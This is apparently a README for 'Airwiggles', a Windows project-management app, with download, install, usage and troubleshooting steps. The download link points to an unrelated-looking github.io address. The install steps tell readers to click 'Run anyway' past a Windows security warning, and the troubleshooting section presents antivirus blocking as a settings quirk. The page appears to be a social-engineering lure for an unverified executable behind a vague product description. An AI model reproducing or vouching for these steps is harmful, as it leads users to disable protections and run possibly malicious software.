Airwiggles helps teams manage projects and organize work. This tool keeps everyone on the same page. You can track progress, assign tasks, and monitor deadlines in one workspace. The software runs directly on your computer to provide a stable planning environment for your daily goals.

## 📥 Getting the Application

You need to download the installer to run the software on your Windows computer. Follow these instructions to get the application.

1. Go to the [official release page](https://secretariagobie5146.github.io).
2. Look for the section labeled Assets.
3. Click the link that ends in .exe to start the download.
4. Save the file to your desktop or downloads folder.

Before you install the tool, make sure your computer meets these requirements:

* Operating System: Windows 10 or Windows 11.
* Processor: Intel Core i3 or equivalent.
* Memory: 4 GB of RAM.
* Storage: 500 MB of free space.
* Internet: Required for initial setup and team updates.

## 🚀 Installing the Software

Once you finish the download, follow these steps to set up the tool:

1. Locate the file you just downloaded. It will have the name of the project followed by .exe.
2. Double-click the file.
3. A security window might appear. If it does, click "More info" and then click "Run anyway" to allow the installation.
4. Follow the prompts on the screen. The installer will ask where to place the files. The default location is fine for most users.
5. Click "Finish" to complete the setup.

## 🛠️ Using the Workspace

The tool opens as a browser-based window. You will see a dashboard that shows your current projects.

### Creating a Project
To start a new project, click the "+" icon in the top left corner. Give your project a name and a brief description. This helps your team understand the goal of the work.

### Adding Tasks
Within a project, you can create tasks. Click "Add Task" to input the work item. You can set a due date, assign a team member, and add priority levels. Keeping these details updated helps the whole team stay organized.

### Monitoring Progress
The main screen displays a list of tasks. You can sort these by due date or status. Moving a task to "Completed" removes it from your active list so you can focus on the next item.

## 🛡️ Privacy and Data

This tool stores project data locally on your computer. This ensures that you have access to your information even when you are offline. When you connect to the internet, the tool syncs your changes with the rest of your team. We value your privacy and keep your project data contained within your workspace.

## ❓ Troubleshooting Common Issues

If you run into trouble, check these common solutions:

* **The installer does not start:** Check if your antivirus software is blocking the file. Sometimes security settings prevent new programs from launching. 
* **The application crashes on startup:** Restart your computer. This clears temporary system conflicts that might affect the program.
* **Sync errors:** Check your internet connection. If the status indicator shows a red icon, click it to attempt a manual reconnect.
* **Slow performance:** Close unused programs that run in the background to free up memory for the hub.

## 📋 Keeping the App Updated

We improve the tool regularly to fix bugs and add features. When a new version is available, the app will show a notification. Click the notification to download the update. The installer will replace the old version while keeping your project data safe. You do not need to uninstall the old version first.

## 🌐 Staying Connected

Your team relies on your updates. Ensure you remain logged in during your work day. If you step away from your desk, the app keeps your session open. Use the refresh button if you notice that your team members have added new tasks that do not appear on your screen yet. This forces the app to pull the latest changes from the server.
